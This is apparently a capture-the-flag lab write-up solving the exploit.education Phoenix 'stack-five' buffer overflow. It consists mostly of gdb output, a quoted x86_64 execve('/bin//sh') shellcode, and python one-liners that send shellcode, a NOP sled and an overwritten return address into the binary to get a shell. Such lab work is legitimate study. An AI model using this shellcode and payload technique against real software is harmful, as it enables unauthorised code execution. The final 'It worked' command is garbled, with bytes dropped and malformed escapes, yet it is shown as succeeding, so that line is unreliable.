# Stack Five
## Task 
Link: https://exploit.education/phoenix/stack-five/ 

> As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.
>
> **Hints**
>
> Don’t feel like you have to write your own shellcode just yet – there’s plenty on the internet.
If you wish to debug your shellcode, be sure to make use of the breakpoint instruction. On i386 / x86_64, that’s 0xcc, and will cause a SIGTRAP.
Make sure you remove those breakpoints after you’re done.


```c++
/*
 * phoenix/stack-five, by https://exploit.education
 *
 * Can you execve("/bin/sh", ...) ?
 *
 * What is green and goes to summer camp? A brussel scout.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```


## Solution
We already [know](https://linux.die.net/man/3/gets) that the `gets` function is vulnerable to buffer overflow. We need to overflow it with a shellcode that will trigger `/bin/sh`.    

There are lots of shellcodes examples [here](https://shell-storm.org/shellcode/index.html). Before entering the shellcode we need to understand the size we need to fill inside the stack in order to overwrite the return address with an address to our shellcode.  

We will allocate the buffer with 128 bytes and check the lowest address and the address of the return address and then calculate how many bytes we need to fill.  

We first need to check what is the return address (not the address of it), and we found that it is `0x4005c7`:

```gdb
user@phoenix-amd64:/opt/phoenix/amd64$ gdb ./stack-five

# Finding the return address = 0x4005c7, after the call to start_level
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004005a4 <+0>:     push   rbp
   0x00000000004005a5 <+1>:     mov    rbp,rsp
   0x00000000004005a8 <+4>:     sub    rsp,0x10
   0x00000000004005ac <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005af <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005b3 <+15>:    mov    edi,0x400620
   0x00000000004005b8 <+20>:    call   0x400400 <puts@plt>
   0x00000000004005bd <+25>:    mov    eax,0x0
   0x00000000004005c2 <+30>:    call   0x40058d <start_level>
   0x00000000004005c7 <+35>:    mov    eax,0x0
   0x00000000004005cc <+40>:    leave  
   0x00000000004005cd <+41>:    ret    
End of assembler dump.
```

We will go to the `start_level` function and set breakpoint after (`0x4005a1`) the `gets` function and:  
```gdb
(gdb) disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:     push   rbp
   0x000000000040058e <+1>:     mov    rbp,rsp
   0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:    mov    rdi,rax
   0x000000000040059c <+15>:    call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:    nop
   0x00000000004005a2 <+21>:    leave  
   0x00000000004005a3 <+22>:    ret

(gdb) b *0x4005a1
Breakpoint 1 at 0x4005a1
```

We will run the program with a 128 bytes string:  
```gdb
(gdb) run <<< $(python -c 'print "A" + "B"*126 + "C"')
0x00007fffffffe590│+0x0000: "ABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"    ← $rax, $rsp, $r8
0x00007fffffffe598│+0x0008: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0x00007fffffffe5a0│+0x0010: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0x00007fffffffe5a8│+0x0018: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0x00007fffffffe5b0│+0x0020: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0x00007fffffffe5b8│+0x0028: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0x00007fffffffe5c0│+0x0030: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0x00007fffffffe5c8│+0x0038: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400594 <start_level+7>  or     BYTE PTR [rax-0x73], 0x45
     0x400598 <start_level+11> or     BYTE PTR [rax-0x77], 0xc7
     0x40059c <start_level+15> call   0x4003f0 <gets@plt>
 →   0x4005a1 <start_level+20> nop    
     0x4005a2 <start_level+21> leave  
     0x4005a3 <start_level+22> ret    
     0x4005a4 <main+0>         push   rbp
     0x4005a5 <main+1>         mov    rbp, rsp
     0x4005a8 <main+4>         sub    rsp, 0x10
```

Printing the RSP register:  
```gdb
(gdb) x/40x $rsp
0x7fffffffe590: 0x42424241      0x42424242      0x42424242      0x42424242
0x7fffffffe5a0: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe5b0: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe5c0: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe5d0: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe5e0: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe5f0: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe600: 0x42424242      0x42424242      0x42424242      0x43424242
0x7fffffffe610: 0xffff0000      0x00007fff      0x004005c7      0x00000000
0x7fffffffe620: 0xffffe688      0x00007fff      0x00000000      0x00000001

# return address
(gdb) x $rbp+8
0x7fffffffe618: 0x004005c7

# Return address - lowest address of the buffer 
(gdb) printf "%i\n", 0x7fffffffe618 - 0x7fffffffe590
136
```

The lowest address is `0x7fffffffe590` and it starts with `0x41 'A'`. We can see the return address `0x4005c7` at address `0x7fffffffe618`. The size between them is **136** bytes. 
This is what our stack looks like:  
```
---------------------
|                   |  high addresses
---------------------
|  local arguments  |  RBP + 16
--------------------- 
|  return address   |  RBP + 8 = 0x7fffffffe618: 0x004005c7
---------------------
|  saved RBP        |  <- RBP = 0x7fffffffe610
---------------------
|   buffer[0]       |  RBP - 8 = 0x7fffffffe608: 0x42424242  0x43424242 (Ends at 0x7fffffffe60f)
---------------------
|   buffer[1]       |
---------------------
|    ....           |
---------------------
|    buffer[127]    |  RBP-(8*16) = 0x7fffffffe590: 0x42424241 0x42424242
---------------------

# The last address is RBP-(8*16) because each buffer is 8 bytes and 128/8 is 16.
```

Our plan is to create the payload like that:  
```
shellcode (size of x) + 0x90 (size of 136-x) + <address to the start of the shellcode>
```

We already have the address to the start of the shellcode `0x7fffffffe590`. We just need to find a shellcode.  

### Shellcode  
None of the [X86–64 shellcodes](https://shell-storm.org/shellcode/index.html) worked for me, eventually, I found [this](https://www.voidsecurity.in/2013/08/stdin-reopen-execve-binsh-shellcode-for.html)https://www.voidsecurity.in/2013/08/stdin-reopen-execve-binsh-shellcode-for.html shellcode to work.

Shellcode:  
```c++
/* https://www.voidsecurity.in/2013/08/stdin-reopen-execve-binsh-shellcode-for.html 
  gcc -z execstack -o shell shell.c */
/* stdin reopen & execve /bin/sh shellcode for Linux/x86_64 */

/* 
   0x600880 <code>:    xor    rax,rax
   0x600883 <code+3>:  push   rax
   0x600884 <code+4>:  pop    rdi
   0x600885 <code+5>:  mov    al,0x3
   0x600887 <code+7>:  syscall   ; close(0)
   0x600889 <code+9>:  push   rax
   0x60088a <code+10>: movabs rdi,0x7974742f7665642f
   0x600894 <code+20>: push   rdi
   0x600895 <code+21>: push   rsp
   0x600896 <code+22>: pop    rdi
   0x600897 <code+23>: push   rax
   0x600898 <code+24>: pop    rsi
   0x600899 <code+25>: mov    si,0x2702
   0x60089d <code+29>: mov    al,0x2
   0x60089f <code+31>: syscall ; open("/dev/tty", O_RDWR|O_NOCTTY|O_TRUNC|O_APPEND|O_ASYNC)
   0x6008a1 <code+33>: push   rax
   0x6008a2 <code+34>: movabs rdi,0x68732f2f6e69622f
   0x6008ac <code+44>: push   rdi
   0x6008ad <code+45>: push   rsp
   0x6008ae <code+46>: pop    rdi
   0x6008af <code+47>: push   rax
   0x6008b0 <code+48>: push   rdi
   0x6008b1 <code+49>: push   rsp
   0x6008b2 <code+50>: pop    rsi
   0x6008b3 <code+51>: cqo    
   0x6008b5 <code+53>: mov    al,0x3b
   0x6008b7 <code+55>: syscall   ; execve("/bin//sh", ["/bin//sh"], NULL)
*/

char code[] = 
"\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05"
"\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05"
"\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05";

void main(void) {
    void (*f)() = (void(*)())code;
    f();
}
```

### Exploit  

```
# (shellcode_size=57) + (79 Nops) + reutn address

python -c "print '\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05' + '\x90'*79 + '\x90\xe5\xff\xff\xff\x7f'" | ./stack-five
```  

After we ran it, it failed:  
```bash
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05' + '\x90'*79 + '\x90\xE5\xFF\xFF\xFF\x7F'" | ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Illegal instruction
```

The problem is that the return address offered by GDB is different from the one executed from a shell. 
GDB automatically sets two environment variables `LINES` and `COLUMNS`. When they are added, the program stack gets pushed down the address varies.   
To fix it we can unset them in GDB:  
```bash
unset env LINES
unset env COLUMNS
```

There is another option to check for the return address, we can run the program from a shell and attach it with GDB.  
```gdb
# Program is running on a differnet terminal

# Checking the program PID
user@phoenix-amd64:/opt/phoenix/amd64$ ps aux | grep stack-five
phoenix+ 10157  0.0  0.0    752     4 pts/1    S+   12:03   0:00 ./stack-five

user@phoenix-amd64:/opt/phoenix/amd64$ sudo gdb
(gdb) attach 10157

# Breakpoint one line after gets()
(gdb) b *0x4005a1
Breakpoint 1 at 0x4005a1

# Run on the program 'ABBBBC'

# Continue to get the breakpoint
(gdb) c

(gdb) disassemble main       
Dump of assembler code for function main:
   0x00000000004005a4 <+0>:     push   rbp
   0x00000000004005a5 <+1>:     mov    rbp,rsp
   0x00000000004005a8 <+4>:     sub    rsp,0x10
   0x00000000004005ac <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005af <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005b3 <+15>:    mov    edi,0x400620
   0x00000000004005b8 <+20>:    call   0x400400 <puts@plt>
   0x00000000004005bd <+25>:    mov    eax,0x0
   0x00000000004005c2 <+30>:    call   0x40058d <start_level>
   0x00000000004005c7 <+35>:    mov    eax,0x0
   0x00000000004005cc <+40>:    leave  
   0x00000000004005cd <+41>:    ret  

(gdb) x/50x $rsp
0x7fffffffe5f0: 0x42424241      0x00004342      0x00400620      0x00000000
0x7fffffffe600: 0x004005a4      0x00000000      0x00000000      0x00000000
0x7fffffffe610: 0x00000000      0x00000000      0xf7db6dde      0x00007fff
0x7fffffffe620: 0x004005a4      0x00000000      0x00b10028      0x00000000
0x7fffffffe630: 0x00000000      0x00000000      0xf7db6b1e      0x00007fff
0x7fffffffe640: 0xf7ffb300      0x00007fff      0x00000000      0x0a000000
0x7fffffffe650: 0xf7ffb300      0x00007fff      0xf7db9934      0x00007fff
0x7fffffffe660: 0xffffe6e8      0x00007fff      0xffffe690      0x00007fff
0x7fffffffe670: 0xffffe690      0x00007fff      0x004005c7      0x00000000
```

On the printing of `rsp` we see that the address of the buffer starts at `0x7fffffffe5f0`. We changed the return address to the above address on our exploit:  
```
python -c "print '\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05' + '\x90'*79 + '\xf0\xe5\xff\xff\xff\x7f'" | ./stack-five
```

It worked:  
```
user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x5' + '\x90'*79 + '\xf0\xe5\xff\xff\xff\x7f'" | ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
$ whoami
phoenix-amd64-stack-five
```




